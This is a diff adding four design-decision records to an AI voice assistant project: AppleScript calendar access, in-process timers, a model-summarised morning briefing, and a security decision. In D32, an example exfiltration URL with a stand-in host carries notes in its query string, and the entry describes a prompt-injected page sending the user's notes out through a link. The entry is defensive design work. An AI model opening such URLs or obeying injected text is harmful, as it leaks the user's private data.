@@ -38,6 +38,10 @@ what we're trading away. Newest at the bottom. Reversed decisions are marked **S
 | D28 | Search via ytmusicapi, playback via the desktop app | Accepted | 2026-10-17 |
 | D29 | DJ v1: pause → speak → play; model picks from radio + likes | Accepted | 2026-10-17 |
 | D30 | ytmusicapi browser-cookie login (not OAuth) | Accepted | 2026-10-17 |
+| D31 | Reminders/Calendar through AppleScript, not EventKit | Accepted | 2026-10-17 |
+| D32 | `open_url` asks first; clipboard text is untrusted | Accepted | 2026-10-17 |
+| D33 | Timers live in the running process | Accepted | 2026-10-17 |
+| D34 | The morning briefing is a tool the model summarises | Accepted | 2026-10-17 |
 
 ---
 
@@ -673,3 +677,75 @@ and expiry shows up as a note instead of an error.
 
 ### Revisit if
 Re-pasting headers gets tedious → set up B.
+
+---
+
+## D31. Reminders/Calendar through AppleScript, not EventKit
+
+**Status:** Accepted · **Date:** 2026-10-17 · **Phase:** 6
+
+### Options considered
+
+| Option | Pros | Cons |
+|---|---|---|
+| **A. `osascript` with quoted values and dates built from numbers** | No dependency; every script compile-checked with `osacompile`; works with any calendar account the Calendar app has | Slow with many calendars; repeating events not expanded |
+| B. EventKit via pyobjc | Fast; recurrences expanded | Heavy dependency; entitlement prompts for a bare Python binary are flaky |
+| C. Google Calendar API | Works off-Mac | OAuth setup; only Google calendars |
+
+### Decision
+A ([osa.py](../../escanor/assistant/osa.py), [apple.py](../../escanor/assistant/apple.py)). C stays the plan's "optional later".
+
+### Revisit if
+Weekly meetings missing from "what's on today?" becomes a real problem → B for reads.
+
+---
+
+## D32. `open_url` asks first; clipboard text is untrusted
+
+**Status:** Accepted · **Date:** 2026-10-17 · **Phase:** 6
+
+### Context
+A URL can carry data out in its query string ("open https://evil.test/?notes=…"), and the clipboard holds
+whatever you last copied, including web text.
+
+### Options considered
+
+| Option | Pros | Cons |
+|---|---|---|
+| **A. `open_url` = external (confirm); `open_app`, `notify` = write; clipboard = read + untrusted** | Closes the exfiltration path; clipboard text can't instruct the model | One "Allow?" per link |
+| B. All `write` | Smoother | A prompt-injected page could send your notes to a server via a link |
+
+### Decision
+A.
+
+---
+
+## D33. Timers live in the running process
+
+**Status:** Accepted · **Date:** 2026-10-17 · **Phase:** 6
+
+### Options considered
+
+| Option | Pros | Cons |
+|---|---|---|
+| **A. asyncio tasks; announce by notification + speech + CLI print** | Simple; spoken through AudioOut at TIMER priority | Lost if Escanor stops |
+| B. Persist and reschedule on start | Survives restarts | A store and catch-up logic for something Reminders already does |
+
+### Decision
+A ([timers.py](../../escanor/assistant/timers.py)). The tool description steers anything important to a reminder.
+
+---
+
+## D34. The morning briefing is a tool the model summarises
+
+**Status:** Accepted · **Date:** 2026-10-17 · **Phase:** 6
+
+### Options considered
+
+| Option | Pros | Cons |
+|---|---|---|
+| **A. `morning_briefing` (core) gathers sources; the model writes the summary** | Works by voice ("good morning"), text, or `escanor brief`; sources pluggable (Phase 7 adds reviews due) | One model turn per briefing |
+| B. A fixed template printed by the CLI | No model call | Robotic; not available by voice |
+
+### Decision
+A ([briefing.py](../../escanor/assistant/briefing.py)). Each source fails independently.
